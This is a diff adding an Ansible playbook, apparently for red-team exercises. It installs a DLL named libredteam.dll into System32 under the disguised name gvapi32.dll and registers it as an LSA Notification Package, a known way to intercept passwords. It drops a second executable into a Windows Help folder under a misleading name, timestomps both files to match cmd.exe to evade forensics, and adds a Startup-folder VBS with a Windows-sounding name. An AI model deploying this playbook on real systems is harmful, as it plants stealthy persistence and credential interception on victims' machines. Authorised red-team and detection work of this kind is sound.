@@ -1,0 +1,58 @@
+---    
+- name: Copy libredteam.dll to System32 directory
+  ansible.windows.win_copy:
+    src: libredteam.dll
+    dest: C:\Windows\System32\gvapi32.dll
+  register: copy_result
+
+- name: timestomp dll
+  win_shell: |
+    $source = Get-Item "C:\Windows\System32\cmd.exe"
+    $destination = Get-Item "C:\Windows\System32\gvapi32.dll"
+    $destination.CreationTime = $source.CreationTime
+    $destination.LastAccessTime = $source.LastAccessTime
+    $destination.LastWriteTime = $source.LastWriteTime
+  args:
+    executable: powershell
+  when: copy_result is changed
+
+- name: Get current LSA notification packages
+  ansible.builtin.win_shell: |
+    (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa')."Notification Packages"
+  register: current_notification_packages
+
+- name: Add redteam to LSA notificationPackages registry key
+  win_regedit:
+    path: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa
+    name: "Notification Packages"
+    data: "{{ current_notification_packages.stdout_lines + ['gvapi32.dll'] | unique}}"
+    datatype: multistring
+    state: present
+  register: registry_modification
+
+- name: Copy service.exe to a random path
+  win_copy:
+    src: service.exe
+    dest: C:\Windows\Help\Windows\IndexStore\en-US\gvapi32.exe
+  register: service_copy
+
+- name: Timestomp service.exe
+  win_shell: |
+    $source = Get-Item "C:\Windows\System32\cmd.exe"
+    $destination = Get-Item "C:\Windows\Help\Windows\IndexStore\en-US\gvapi32.exe"
+    $destination.CreationTime = $source.CreationTime
+    $destination.LastAccessTime = $source.LastAccessTime
+    $destination.LastWriteTime = $source.LastWriteTime
+  args:
+    executable: powershell
+  when: service_copy is changed
+
+- name: Create a scheduled task to run an executable on user logon
+  win_copy:
+    src: autorun.vbs
+    dest: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsGlobalizationAPI.vbs
+    
+- name: Restart
+  ansible.windows.win_reboot:
+  when:
+    - copy_result.changed or registry_modification.changed
